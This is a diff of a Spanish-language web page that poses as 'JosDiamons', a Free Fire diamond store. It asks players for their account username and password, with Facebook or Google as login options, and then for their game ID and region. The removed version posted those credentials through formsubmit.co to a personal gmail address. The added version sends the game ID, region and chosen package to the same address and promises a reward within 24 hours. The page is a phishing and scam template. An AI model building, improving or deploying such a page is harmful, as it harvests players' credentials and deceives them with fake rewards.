@@ -1,64 +1,57 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tienda JosDiamons</title>
+  <title>JosDiamons - Tienda Free Fire</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
-      background-color: #1b1b2f;
-      color: #ffffff;
       margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-image: url('fondo.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: white;
+      text-shadow: 1px 1px 2px black;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
       padding: 20px;
+      background-color: rgba(0, 0, 0, 0.6);
+      border-radius: 10px;
+      margin-top: 40px;
+    }
+
+    h2 {
       text-align: center;
+      color: #ffcc00;
     }
 
-    .banner-animado {
-      font-size: 24px;
+    label {
+      display: block;
+      margin-top: 10px;
       font-weight: bold;
-      background: linear-gradient(90deg, #ffcc00, #ff6600, #ffcc00);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: mover 3s infinite linear;
-      margin: 20px 0;
-    }
-
-    @keyframes mover {
-      0% { background-position: 0%; }
-      100% { background-position: 200%; }
     }
 
     input, select, button {
-      display: block;
-      width: 90%;
-      max-width: 300px;
-      margin: 10px auto;
+      width: 100%;
       padding: 10px;
-      font-size: 16px;
-      border-radius: 8px;
+      margin-top: 5px;
+      border-radius: 5px;
       border: none;
+      margin-bottom: 10px;
     }
 
     button {
-      background-color: #ff6600;
+      background-color: #00cc66;
       color: white;
-      cursor: pointer;
       font-weight: bold;
-    }
-
-    .opciones {
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      margin-top: 20px;
-    }
-
-    .opcion {
-      background-color: #222;
-      padding: 15px;
-      border-radius: 12px;
+      cursor: pointer;
     }
 
     .seccion {
@@ -69,103 +62,94 @@
       display: block;
     }
 
-    .mensaje-final {
-      background-color: #2d2d2d;
-      padding: 20px;
-      border-radius: 10px;
-      margin-top: 30px;
+    .cuentas {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+
+    .cuentas button {
+      flex: 1;
+      background-color: #3366ff;
     }
   </style>
 </head>
 <body>
-  <div class="banner-animado">¡Bienvenido a la Tienda JosDiamons!</div>
 
-  <!-- FORMULARIO COMPLETO -->
-  <form id="formularioDiamantes" action="https://formsubmit.co/ajax/muriilloventee@gmail.com" method="POST">
-    
-    <!-- Pantalla 1: Inicio de sesión -->
+  <div class="container">
+    <h2>Bienvenido a JosDiamons</h2>
+
     <div id="login" class="seccion visible">
-      <h2>Inicia sesión</h2>
-      <input type="text" name="usuario" placeholder="Usuario" required />
-      <input type="password" name="contraseña" placeholder="Contraseña" required />
-      <button type="button" onclick="mostrarSeccion('diamantes')">Entrar</button>
-    </div>
-
-    <!-- Pantalla 2: Selección de diamantes -->
-    <div id="diamantes" class="seccion">
-      <h2>Selecciona una cantidad</h2>
-      <div class="opciones">
-        <div class="opcion">
-          <h3>Adquirir 100 diamantes</h3>
-          <button type="button" onclick="seleccionarDiamantes('100')">Adquirir</button>
-        </div>
-        <div class="opcion">
-          <h3>Adquirir 200 diamantes</h3>
-          <button type="button" onclick="seleccionarDiamantes('200')">Adquirir</button>
-        </div>
-        <div class="opcion">
-          <h3>Adquirir 350 diamantes</h3>
-          <button type="button" onclick="seleccionarDiamantes('350')">Adquirir</button>
-        </div>
+      <p>Inicia sesión con tu cuenta de Free Fire:</p>
+      <div class="cuentas">
+        <button onclick="seleccionarCuenta('Facebook')">Facebook</button>
+        <button onclick="seleccionarCuenta('Google')">Google</button>
       </div>
+      <form id="loginForm" onsubmit="mostrarCompra(event)">
+        <label for="usuario">Usuario</label>
+        <input type="text" id="usuario" name="usuario" required />
+        <label for="clave">Contraseña</label>
+        <input type="password" id="clave" name="clave" required />
+        <input type="hidden" id="cuentaSeleccionada" name="cuenta" />
+        <button type="submit">Iniciar sesión</button>
+      </form>
     </div>
 
-    <!-- Pantalla 3: ID y región -->
-    <div id="formulario" class="seccion">
-      <h2>Completa tus datos</h2>
-      <input type="hidden" id="cantidadDiamantes" name="diamantes" />
-      <input type="text" name="id_del_juego" placeholder="ID del juego" required />
-      <select name="region" required>
-        <option value="">Selecciona tu región</option>
-        <option value="norte">Norte</option>
-        <option value="eeuu">EEUU</option>
-      </select>
-      <button type="submit">Enviar</button>
-    </div>
-  </form>
+    <div id="compra" class="seccion">
+      <form action="https://formsubmit.co/muriilloventee@gmail.com" method="POST" onsubmit="mostrarGracias(event)">
+        <h3>Selecciona tu paquete</h3>
+        <label>
+          <input type="radio" name="diamantes" value="100 diamantes" required /> 100 diamantes
+        </label>
+        <label>
+          <input type="radio" name="diamantes" value="200 diamantes" /> 200 diamantes
+        </label>
+        <label>
+          <input type="radio" name="diamantes" value="350 diamantes" /> 350 diamantes
+        </label>
 
-  <!-- Mensaje de éxito -->
-  <div id="mensajeFinal" class="mensaje-final seccion">
-    <h2>¡Congratulations!</h2>
-    <p>Gracias por usar nuestro servicio y confiar en nosotros.</p>
-    <p>Tu recompensa estará llegando en cuanto revisemos tu pedido.</p>
-    <p><strong>Tiempo estimado: de 5 a 24 horas.</strong></p>
+        <label for="idjuego">Tu ID del juego</label>
+        <input type="text" name="idjuego" required />
+
+        <label for="region">Selecciona tu región</label>
+        <select name="region" required>
+          <option value="">Elige una región</option>
+          <option value="EEUU">EEUU</option>
+          <option value="Norte">Norte</option>
+        </select>
+
+        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+
+    <div id="gracias" class="seccion">
+      <h3>¡Congratulations!</h3>
+      <p>Gracias por usar nuestro servicio y confiar en nosotros.</p>
+      <p>Tu recompensa estará llegando en cuanto revisemos tu pedido.</p>
+      <p><strong>Espera de unas 5 a máximo 24 horas.</strong></p>
+    </div>
   </div>
 
   <script>
-    function mostrarSeccion(id) {
-      document.getElementById("login").classList.remove("visible");
-      document.getElementById("diamantes").classList.remove("visible");
-      document.getElementById("formulario").classList.remove("visible");
-      document.getElementById("mensajeFinal").classList.remove("visible");
-      document.getElementById(id).classList.add("visible");
+    function seleccionarCuenta(cuenta) {
+      document.getElementById('cuentaSeleccionada').value = cuenta;
     }
 
-    function seleccionarDiamantes(cantidad) {
-      document.getElementById("cantidadDiamantes").value = cantidad + " diamantes";
-      mostrarSeccion("formulario");
+    function mostrarCompra(event) {
+      event.preventDefault();
+      document.getElementById('login').classList.remove('visible');
+      document.getElementById('compra').classList.add('visible');
     }
 
-    document.getElementById("formularioDiamantes").addEventListener("submit", function (e) {
-      e.preventDefault(); // Detiene el envío normal
-      const form = e.target;
-
-      fetch(form.action, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify(Object.fromEntries(new FormData(form))),
-      })
-      .then(() => {
-        mostrarSeccion("mensajeFinal");
-        form.reset();
-      })
-      .catch(() => {
-        alert("Hubo un error al enviar el formulario.");
-      });
-    });
+    function mostrarGracias(event) {
+      event.preventDefault();
+      document.getElementById('compra').classList.remove('visible');
+      document.getElementById('gracias').classList.add('visible');
+      setTimeout(() => event.target.submit(), 3000);
+    }
   </script>
+
 </body>
-</html>
+  </html>
